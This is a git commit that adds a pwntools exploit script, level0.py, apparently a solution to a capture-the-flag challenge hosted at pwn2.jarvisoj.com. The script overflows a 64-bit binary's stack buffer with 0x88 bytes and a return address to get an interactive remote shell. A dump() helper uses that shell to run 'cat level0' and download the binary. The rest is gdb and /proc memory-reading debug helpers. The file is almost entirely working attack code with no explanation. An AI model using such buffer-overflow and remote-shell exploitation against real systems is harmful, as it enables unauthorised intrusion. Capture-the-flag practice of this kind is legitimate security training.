c9dbb1a370a3995be109e4a0954db057cd47365d
wooy0ung <wooy0ung@outlook.com>
2019-08-20 12:07:47 +0800

    c

---
+++ level0.py
@@ -0,0 +1,96 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+import os, sys
+
+DEBUG = 3
+context.arch = "amd64"
+#context.log_level = "debug"
+elf = ELF("./level0",checksec=False)
+
+# synonyms for faster typing
+tube.s = tube.send
+tube.sl = tube.sendline
+tube.sa = tube.sendafter
+tube.sla = tube.sendlineafter
+tube.r = tube.recv
+tube.ru = tube.recvuntil
+tube.rl = tube.recvline
+tube.ra = tube.recvall
+tube.rr = tube.recvregex
+tube.irt = tube.interactive
+
+if DEBUG == 1:
+	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
+	s = process("./level0")
+elif DEBUG == 2:
+	libc = ELF("./libc.so.6",checksec=False)
+	s = process("./level0", env={"LD_PRELOAD":"./libc.so.6"})
+elif DEBUG == 3:
+	#libc = ELF("./libc.so.6",checksec=False)
+	ip = "pwn2.jarvisoj.com" 
+	port = 9881
+	s = remote(ip,port)
+
+def z(addr):
+    raw_input("debug?")
+    gdb.attach(s, "b *" + str(addr))
+
+wordSz = 4
+hwordSz = 2
+bits = 32
+PIE = 0
+mypid=0
+def leak(address, size):
+   with open("/proc/%s/mem" % mypid) as mem:
+      mem.seek(address)
+      return mem.read(size)
+
+def findModuleBase(pid, mem):
+   name = os.readlink("/proc/%s/exe" % pid)
+   with open("/proc/%s/maps" % pid) as maps:
+      for line in maps:
+         if name in line:
+            addr = int(line.split("-")[0], 16)
+            mem.seek(addr)
+            if mem.read(4) == "\x7fELF":
+               bitFormat = u8(leak(addr + 4, 1))
+               if bitFormat == 2:
+                  global wordSz
+                  global hwordSz
+                  global bits
+                  wordSz = 8
+                  hwordSz = 4
+                  bits = 64
+               return addr
+   log.failure("Module's base address not found.")
+   sys.exit(1)
+
+def zx(addr = 0):
+    global mypid
+    mypid = proc.pidof(s)[0]
+    raw_input("debug?")
+    with open("/proc/%s/mem" % mypid) as mem:
+        moduleBase = findModuleBase(mypid, mem)
+        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))
+
+def pwn():
+   #z(0x4005C4)
+
+   s.s("A"*0x88 + p64(0x400596))
+
+   s.irt()
+
+def dump():
+	pwn()
+	s.recv(timeout=1)
+	s.sl("cat level0")
+	s.sl("exit")
+	data = s.ra()
+	f = open("dump", "wb")
+	f.write(data)
+	f.close()
+
+if __name__ == "__main__":
+    pwn()
